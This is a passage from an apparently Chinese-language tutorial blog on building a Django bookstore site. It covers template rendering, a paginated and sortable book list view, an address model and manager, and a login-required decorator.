class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span> <span class="attr">class</span>=<span class="string">"minus fr"</span>&gt;</span>-<span class="tag">&lt;/<span class="name">a</span>&gt;</span>   </span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"total"</span>&gt;</span>总价：<span class="tag">&lt;<span class="name">em</span>&gt;</span>100元<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"operate_btn"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span> <span class="attr">class</span>=<span class="string">"buy_btn"</span>&gt;</span>立即购买<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span> <span class="attr">class</span>=<span class="string">"add_cart"</span> <span class="attr">id</span>=<span class="string">"add_cart"</span>&gt;</span>加入购物车<span class="tag">&lt;/<span class="name">a</span>&gt;</span>             </span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main_wrap clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"l_wrap fl clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"new_book"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h3</span>&gt;</span>新品推荐<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                    &#123;% for book in books_li %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'books:detail' books_id=books.id %&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static book.image %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'books:detail' books_id=books.id %&#125;"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"price"</span>&gt;</span>￥&#123;&#123; book.price &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    &#123;% endfor %&#125;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"r_wrap fr clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"detail_tab clearfix"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span>商品介绍<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>评论<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tab_content"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">dt</span>&gt;</span>商品详情：<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">dd</span>&gt;</span>&#123;&#123; books.detail | safe &#125;&#125;<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"add_jump"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock body %&#125;</span><br></pre></td></tr></table></figure></p><p>这里要注意的是override也就是复写的问题，其实是面向对象的思想。</p><h2 id="9，列表页的开发"><a href="#9，列表页的开发" class="headerlink" title="9，列表页的开发"></a>9，列表页的开发</h2><p>接下来我们来实现列表页。通过观察list.html我们可以发现，这里有分页的功能，以及按照不同特征来进行排序，比如价格，比如人气这样的特征。这里要注意分页功能的实现，以及为什么要分页，一下读取所有数据，数据库的压力很大。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 商品种类 页码 排序方式</span></span><br><span class="line"><span class="comment"># /list/(种类id)/(页码)/?sort=排序方式</span></span><br><span class="line"><span class="keyword">from</span> django.core.paginator <span class="keyword">import</span> Paginator</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list</span><span class="params">(request, type_id, page)</span>:</span></span><br><span class="line">    <span class="string">'''商品列表页面'''</span></span><br><span class="line">    <span class="comment"># 获取排序方式</span></span><br><span class="line">    sort = request.GET.get(<span class="string">'sort'</span>, <span class="string">'default'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断type_id是否合法</span></span><br><span class="line">    <span class="keyword">if</span> int(type_id) <span class="keyword">not</span> <span class="keyword">in</span> BOOKS_TYPE.keys():</span><br><span class="line">        <span class="keyword">return</span> redirect(reverse(<span class="string">'books:index'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 根据商品种类id和排序方式查询数据</span></span><br><span class="line">    books_li = Books.objects.get_books_by_type(type_id=type_id, sort=sort)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 分页</span></span><br><span class="line">    paginator = Paginator(books_li, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取分页之后的总页数</span></span><br><span class="line">    num_pages = paginator.num_pages</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 取第page页数据</span></span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">''</span> <span class="keyword">or</span> int(page) &gt; num_pages:</span><br><span class="line">        page = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = int(page)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回值是一个Page类的实例对象</span></span><br><span class="line">    books_li = paginator.page(page)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 进行页码控制</span></span><br><span class="line">    <span class="comment"># 1.总页数&lt;5, 显示所有页码</span></span><br><span class="line">    <span class="comment"># 2.当前页是前3页，显示1-5页</span></span><br><span class="line">    <span class="comment"># 3.当前页是后3页，显示后5页 10 9 8 7</span></span><br><span class="line">    <span class="comment"># 4.其他情况，显示当前页前2页，后2页，当前页</span></span><br><span class="line">    <span class="keyword">if</span> num_pages &lt; <span class="number">5</span>:</span><br><span class="line">        pages = range(<span class="number">1</span>, num_pages+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> page &lt;= <span class="number">3</span>:</span><br><span class="line">        pages = range(<span class="number">1</span>, <span class="number">6</span>)</span><br><span class="line">    <span class="keyword">elif</span> num_pages - page &lt;= <span class="number">2</span>:</span><br><span class="line">        pages = range(num_pages<span class="number">-4</span>, num_pages+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pages = range(page<span class="number">-2</span>, page+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 新品推荐</span></span><br><span class="line">    books_new = Books.objects.get_books_by_type(type_id=type_id, limit=<span class="number">2</span>, sort=<span class="string">'new'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义上下文</span></span><br><span class="line">    type_title = BOOKS_TYPE[int(type_id)]</span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'books_li'</span>: books_li,</span><br><span class="line">        <span class="string">'books_new'</span>: books_new,</span><br><span class="line">        <span class="string">'type_id'</span>: type_id,</span><br><span class="line">        <span class="string">'sort'</span>: sort,</span><br><span class="line">        <span class="string">'type_title'</span>: type_title,</span><br><span class="line">        <span class="string">'pages'</span>: pages</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用模板</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'books/list.html'</span>, context)</span><br></pre></td></tr></table></figure></p><p>然后配置urls.py<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># books/urls.py</span></span><br><span class="line">url(<span class="string">r'^list/(?P&lt;type_id&gt;\d+)/(?P&lt;page&gt;\d+)/$'</span>, views.list, name=<span class="string">'list'</span>), <span class="comment"># 列表页</span></span><br></pre></td></tr></table></figure></p><p>将list.html拷贝到templates/books<br>先继承base.html。<br>将index.html首页里面的查看更多，修改url定向。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% url <span class="string">'books:list'</span> type_id=<span class="number">1</span> page=<span class="number">1</span> %&#125;</span><br></pre></td></tr></table></figure></p><p>修改名称。<br><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; type_title &#125;&#125;</span><br></pre></td></tr></table></figure></p><p>新品推荐。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for book in books_new %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'books:detail' books_id=book.id %&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static book.image %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'books:detail' books_id=book.id %&#125;"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"price"</span>&gt;</span>￥&#123;&#123; book.price &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></p><p>按不同的特征排序。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/list/&#123;&#123; type_id &#125;&#125;/1/"</span> &#123;% <span class="attr">if</span> <span class="attr">sort</span> == <span class="string">'default'</span> %&#125;<span class="attr">class</span>=<span class="string">"active"</span>&#123;% <span class="attr">endif</span> %&#125;&gt;</span>默认<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/list/&#123;&#123; type_id &#125;&#125;/1/?sort=price"</span> &#123;% <span class="attr">if</span> <span class="attr">sort</span> == <span class="string">'price'</span> %&#125;<span class="attr">class</span>=<span class="string">"active"</span>&#123;% <span class="attr">endif</span> %&#125;&gt;</span>价格<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/list/&#123;&#123; type_id &#125;&#125;/1/?sort=hot"</span> &#123;% <span class="attr">if</span> <span class="attr">sort</span> == <span class="string">'hot'</span> %&#125;<span class="attr">class</span>=<span class="string">"active"</span>&#123;% <span class="attr">endif</span> %&#125;&gt;</span>人气<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>商品列表<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for books in books_li %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'books:detail' books_id=books.id %&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static books.image %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'books:detail' books_id=books.id %&#125;"</span>&gt;</span>&#123;&#123; books.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"operate"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"price"</span>&gt;</span>￥&#123;&#123; books.price &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"unit"</span>&gt;</span>&#123;&#123; books.unit &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"add_books"</span> <span class="attr">title</span>=<span class="string">"加入购物车"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></p><p>前端分页功能的实现。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if books_li.has_previous %&#125;</span><br><span class="line">    &lt;a href="/list/&#123;&#123; type_id &#125;&#125;/&#123;&#123; books_li.previous_page_number &#125;&#125;/?sort=&#123;&#123; sort &#125;&#125;"&gt;&lt;上一页&lt;/a&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% for pindex in pages %&#125;</span><br><span class="line">    &#123;% if pindex == books_li.number %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/list/&#123;&#123; type_id &#125;&#125;/&#123;&#123; pindex &#125;&#125;/?sort=&#123;&#123; sort &#125;&#125;"</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span>&#123;&#123; pindex &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    &#123;% else %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/list/&#123;&#123; type_id &#125;&#125;/&#123;&#123; pindex &#125;&#125;/?sort=&#123;&#123; sort &#125;&#125;"</span>&gt;</span>&#123;&#123; pindex &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;% if books_li.has_next %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/list/&#123;&#123; type_id &#125;&#125;/&#123;&#123; books_li.next_page_number &#125;&#125;/?sort=&#123;&#123; sort &#125;&#125;"</span>&gt;</span>下一页&gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></p><h1 id="4，用户中心的实现"><a href="#4，用户中心的实现" class="headerlink" title="4，用户中心的实现"></a><a id="4">4，用户中心的实现</a></h1><p>接下来我们来实现用户中心的功能，先不实现最近浏览这个功能。首先来看一下这个前端页面，那我们知道我们还得给User这个model添加地址表。<br>那我们先来建model<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># user/models.py</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Address</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    <span class="string">'''地址模型类'''</span></span><br><span class="line">    recipient_name = models.CharField(max_length=<span class="number">20</span>, verbose_name=<span class="string">'收件人'</span>)</span><br><span class="line">    recipient_addr = models.CharField(max_length=<span class="number">256</span>, verbose_name=<span class="string">'收件地址'</span>)</span><br><span class="line">    zip_code = models.CharField(max_length=<span class="number">6</span>, verbose_name=<span class="string">'邮政编码'</span>)</span><br><span class="line">    recipient_phone = models.CharField(max_length=<span class="number">11</span>, verbose_name=<span class="string">'联系电话'</span>)</span><br><span class="line">    is_default = models.BooleanField(default=<span class="keyword">False</span>, verbose_name=<span class="string">'是否默认'</span>)</span><br><span class="line">    passport = models.ForeignKey(<span class="string">'Passport'</span>, verbose_name=<span class="string">'账户'</span>)</span><br><span class="line"></span><br><span class="line">    objects = AddressManager()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'s_user_address'</span></span><br></pre></td></tr></table></figure></p><p>然后实现AddressManager()，对一些常用函数做抽象。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AddressManager</span><span class="params">(models.Manager)</span>:</span></span><br><span class="line">    <span class="string">'''地址模型管理器类'''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_default_address</span><span class="params">(self, passport_id)</span>:</span></span><br><span class="line">        <span class="string">'''查询指定用户的默认收货地址'''</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            addr = self.get(passport_id=passport_id, is_default=<span class="keyword">True</span>)</span><br><span class="line">        <span class="keyword">except</span> self.model.DoesNotExist:</span><br><span class="line">            <span class="comment"># 没有默认收货地址</span></span><br><span class="line">            addr = <span class="keyword">None</span></span><br><span class="line">        <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_one_address</span><span class="params">(self, passport_id, recipient_name, recipient_addr, zip_code, recipient_phone)</span>:</span></span><br><span class="line">        <span class="string">'''添加收货地址'''</span></span><br><span class="line">        <span class="comment"># 判断用户是否有默认收货地址</span></span><br><span class="line">        addr = self.get_default_address(passport_id=passport_id)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> addr:</span><br><span class="line">            <span class="comment"># 存在默认地址</span></span><br><span class="line">            is_default = <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 不存在默认地址</span></span><br><span class="line">            is_default = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 添加一个地址</span></span><br><span class="line">        addr = self.create(passport_id=passport_id,</span><br><span class="line">                           recipient_name=recipient_name,</span><br><span class="line">                           recipient_addr=recipient_addr,</span><br><span class="line">                           zip_code=zip_code,</span><br><span class="line">                           recipient_phone=recipient_phone,</span><br><span class="line">                           is_default=is_default)</span><br><span class="line">        <span class="keyword">return</span> addr</span><br></pre></td></tr></table></figure></p><p>进行数据库迁移<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python manage.py makemigrations users</span><br><span class="line">$ python manage.py migrate</span><br></pre></td></tr></table></figure></p><p>然后编写视图函数views.py<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''用户中心-信息页'''</span></span><br><span class="line">    passport_id = request.session.get(<span class="string">'passport_id'</span>)</span><br><span class="line">    <span class="comment"># 获取用户的基本信息</span></span><br><span class="line">    addr = Address.objects.get_default_address(passport_id=passport_id)</span><br><span class="line"></span><br><span class="line">    books_li = []</span><br><span class="line"></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'addr'</span>: addr,</span><br><span class="line">        <span class="string">'page'</span>: <span class="string">'user'</span>,</span><br><span class="line">        <span class="string">'books_li'</span>: books_li</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'users/user_center_info.html'</span>, context)</span><br></pre></td></tr></table></figure></p><p>配置urls.py<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^$'</span>, views.user, name=<span class="string">'user'</span>), <span class="comment"># 用户中心-信息页</span></span><br></pre></td></tr></table></figure></p><p>然后将user_center_info.html拷贝到templates/users文件夹下。<br>还是继承base.html，然后对模板进行渲染。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">span</span>&gt;</span>&#123;&#123; request.session.username &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">&#123;% if addr %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>联系方式：<span class="tag">&lt;/<span class="name">span</span>&gt;</span>&#123;&#123; addr.recipient_phone &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>联系地址：<span class="tag">&lt;/<span class="name">span</span>&gt;</span>&#123;&#123; addr.recipient_addr &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>联系方式：<span class="tag">&lt;/<span class="name">span</span>&gt;</span>无<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>联系地址：<span class="tag">&lt;/<span class="name">span</span>&gt;</span>无<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></p><p>我们这里思考一下，用户中心必须登录以后才可以使用，我们应该怎么实现这个功能呢？<br>在这里，python的装饰器功能就派上用场了。<br>新建一个utils文件夹，用来存放自己编写的一些常用功能函数。<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># utils/decorators.py</span></span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> redirect</span><br><span class="line"><span class="keyword">from</span> django.core.urlresolvers <span class="keyword">import</span> reverse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_required</span><span class="params">(view_func)</span>:</span></span><br><span class="line">    <span class="string">'''登录判断装饰器'''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(request, *view_args, **view_kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> request.session.has_key(<span class="string">'islogin'</span>):</span><br><span class="line">            <span class="comment"># 用户已登录</span></span><br><span class="line">            <span class="keyword">return</span> view_func(request, *view_args, **view_kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 跳转到登录页面</span></span><br><span class="line">            <span class="keyword">return</span> redirect(reverse(<span class="string">'user:login'</span>))</span><br><span class="line">    <span class="keyword">return</span> 